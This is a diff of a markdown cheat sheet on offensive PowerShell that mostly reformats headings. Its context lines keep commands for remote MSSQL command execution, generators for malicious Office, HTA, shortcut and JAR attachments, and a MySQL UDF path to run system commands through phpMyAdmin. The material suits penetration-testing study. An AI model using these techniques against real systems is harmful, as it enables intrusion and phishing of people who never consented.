@@ -1,22 +1,9 @@
 # Offensive Powershell
 ---
-# Navigation
-- **[Reconnaissance](#reconnaissance)**
-	- [PortScanning Host discovery](#portscanning-host-discovery)
-	- [Directory discovery](#directory-discovery)
-	- [Shodan](#shodan)
-	- [Automating Nmap](#automating-nmap)
-	- [Brute-Force](#brute-force)
-	- [MSSQL](#mssql)
-- **[Client-Side attacks](#client-side-attacks-malicious-attachmentsmalicious-attachments)
-- **[Exploitation](#exploitation)**
-	- [PHPMyAdmin](#phpmyadmin)
-- **[Metasploit](#metasploit)**
-
 > **Note:**
 >  To list the modules and parameters for a specific function in a module -> [List module commands](Powershell%2520Basics%2523List%2520module%2520commands)
 ---
-# Reconnaissance
+## Reconnaissance
 ## PortScanning & Host discovery
 ```Powershell
 #Powersploit module
@@ -64,7 +51,7 @@ Execute-Commnand-MSSQL -ComputerName abuqasemPC -payload <Command>
 ```
 > `WindowsAuthentication` is useful when our current powershell session have enough privileges to access remote DB but we don't have credentials.
 ---
-# Client-Side attacks
+## Client-Side attacks
 ## Malicious Attachments
 1. **Microsoft-Word & Excel**
 ```powershell
@@ -83,7 +70,6 @@ Out-Shortcut -Payload <Payload>
 ```
 > **Further reading:** https://medium.com/r3d-buck3t/weaponize-chm-files-with-powershell-nishang-c98b93f79f1e
 
-
 3. **Phishing/Drive-by-download**
 - **Out-HTA**: Generates HTML app. and VBS script.
 - **Out-Java**: Generates a malicious jar file.
@@ -95,7 +81,7 @@ Out-Java -Payload "-c <COMMAND>" -JDKPAth <PATH\TO/JDK> -NoSelfSign
 > Both Scripts generate two files.
 
 ---
-# Exploitation
+## Exploitation
 ## PHPMyAdmin
 - **Assumptions**
     - Username / Password of phpMyAdmin is known
@@ -141,7 +127,7 @@ CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys.dll'
 Select sys_eval('whoami')
 ```
 ---
-# Metasploit
+## Metasploit
 PowerShell payload formats
 1. **psh**
 2. **psh-cmd**
